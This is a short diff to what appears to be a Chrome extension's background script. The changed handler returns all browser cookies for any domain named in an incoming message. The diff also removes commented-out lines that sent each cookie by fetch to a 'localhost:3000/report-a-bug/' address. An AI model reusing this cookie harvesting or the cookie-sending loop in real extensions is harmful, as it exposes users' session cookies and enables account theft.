@@ -2,19 +2,9 @@ chrome.runtime.onMessage.addListener(function (message, sender, callback) {
 
     if (message.command === 'GetCookies') {
 
-        checkKnownCookies()
-        callback(cookies)
+        checkKnownCookies(message.param, callback)
 
-        // cookies.filter(function(item) {
-        //     return (item.domain.includes("print"));
-        // });
-        //
-        // for (cookie of cookies) {
-        //
-        //   // $.get( "localhost:3000/report-a-bug/BUGGYBOY", ()=>{});
-        //   fetch('http://localhost:3000/report-a-bug/'+cookie, {mode:'cors'})
-        //
-        // }
+        return true
 
     }
 
@@ -22,18 +12,18 @@ chrome.runtime.onMessage.addListener(function (message, sender, callback) {
 
 let cookies = [] // Hold IDs of recognized cookies
 
-function checkKnownCookies() {
+function checkKnownCookies(search, callback) {
 
-    chrome.cookies.getAll({}, function (theCookies) {
+    chrome.cookies.getAll({domain: search}, function (theCookies) {
 
-        cookies = theCookies.filter(function(item) {
-            return (item.domain.includes("print.mit"));
-        });
+        cookies = theCookies
+        // .filter(function(item) {
+        //     return (item.domain.includes(""));
+        // });
 
-        console.log(cookies)
         callback(cookies)
 
-    });
+    })
 
 }
 
